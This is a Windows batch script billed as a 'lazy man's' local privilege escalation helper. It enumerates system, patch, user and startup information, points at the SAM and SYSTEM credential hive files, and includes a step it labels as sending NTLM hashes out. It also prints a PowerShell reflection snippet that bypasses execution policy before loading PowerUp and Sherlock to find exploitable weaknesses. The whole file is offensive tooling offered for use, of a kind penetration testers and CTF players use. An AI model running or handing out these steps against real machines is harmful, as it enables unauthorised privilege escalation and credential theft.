@echo --- HEADSTART - The Lazy Mans Local Windows Privilege Escalation Scrypt ---
@set /p=Hit ENTER to Play...
@echo - HeadStart: Getting System Info
systeminfo
@set /p=Hit ENTER to continue...
@echo -----------------------------------------------------------------------------
@echo - HeadStart: Getting Env Variables
set
@set /p=Hit ENTER to continue...
@echo -----------------------------------------------------------------------------
@echo - HeadStart: Getting Windows Update Info
wmic qfe get Caption,Description,HotFixID,InstalledOn
@set /p=Hit ENTER to continue...
@echo -----------------------------------------------------------------------------
@echo - HeadStart: Getting User Info
whoami
net localgroup administrators
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
@set /p=Hit ENTER to continue...
@echo -----------------------------------------------------------------------------
@echo - HeadStart: Checking What Runs at Startup
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
@set /p=Hit ENTER to continue...
@echo -----------------------------------------------------------------------------
@echo - HeadStart: Sending NTML Hashs Out...LOL
net view \\localhost\c$
@set /p=Hit ENTER to continue...
@echo -----------------------------------------------------------------------------
@echo - HeadStart: Getting PowerShell Execution Policy
Powershell -command "Get-ExecutionPolicy -List | Format-Table -AutoSize"
@set /p=Hit ENTER to continue...
@echo -----------------------------------------------------------------------------
@echo - HeadStart: Launching Powershell
@echo - HeadStart: Copy-Paste #1 function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}
@echo - HeadStart: Copy-Paste #2 Disable-ExecutionPolicy
@echo - HeadStart: Copy-Paste #3 Import-Module .\PowerUp.ps1 ,.\Sherlock.ps1 
@echo - HeadStart: Copy-Paste #4 Find-AllVulns
@echo - HeadStart: Copy-Paste #4 Invoke-AllChecks
@echo - HeadStart: GoodLuck!---------------------------------------------------------------------
PowerShell.exe

